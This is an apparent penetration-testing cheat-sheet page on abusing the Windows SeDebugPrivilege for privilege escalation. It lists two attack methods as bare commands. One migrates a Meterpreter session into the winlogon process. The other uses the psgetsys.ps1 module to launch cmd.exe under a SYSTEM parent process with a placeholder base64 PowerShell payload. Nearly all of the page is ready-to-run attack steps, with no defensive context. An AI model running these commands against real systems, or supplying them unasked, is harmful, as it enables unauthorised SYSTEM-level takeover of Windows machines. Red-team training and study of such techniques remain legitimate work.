---
title: "SeDebugPrivilege"
date: 2024-8-2
tags: ["SeDebugPrivilege", "Windows", "potato", "privesc", "fullpower"]
---

---
### Abuse #1: Meterpreter Migrate

```bash
# Inside meterpreter
ps winlogon
```

```bash
migrate <PID>
```

### Abuse #2 : psgetsys.ps1

[psgetsys](https://github.com/decoder-it/psgetsystem)

```powershell
# Import module
. .\psgetsys.ps1
```

```powershell
ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <powershell #3 Base64>"
```

<br>